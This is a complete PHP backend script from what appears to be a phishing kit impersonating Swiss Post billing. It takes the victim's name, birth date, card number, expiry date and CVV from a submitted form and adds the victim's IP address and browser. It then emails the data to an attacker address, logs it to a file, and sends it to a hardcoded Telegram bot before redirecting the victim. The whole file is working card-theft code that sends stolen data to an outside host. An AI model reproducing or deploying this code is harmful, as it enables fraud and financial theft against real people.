<?php
require_once('Imo.php');
$IP = getenv("REMOTE_ADDR");
$message .= "--++-----[billing and CVV Swiss ]-----++--\n";
$message .= "-------------- SKILLEUR -----\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "Email  : ".$_POST['phone']."\n";
$message .= "DOB  : ".$_POST['birth']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- SKILLEUR ----------------------\n";
$sender = "CVV Swiss";
$subject = "billingg Swiss Post [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message);
    $text = fopen('../tbon.txt', 'a');
                $token = "5490148847:AAEJaLaG7CtbzMhFAWL8KjqWQ51FFWvdmJU";
$data = [
    'text' => $message,
    'chat_id' => '1901404668'
];

file_get_contents("https://api.telegram.org/bot5490148847:AAEJaLaG7CtbzMhFAWL8KjqWQ51FFWvdmJU/sendMessage?chat_id=1901404668&text=" . http_build_query($data) );
fwrite($text, $message);

header("Location: ../wait/index.php");?>
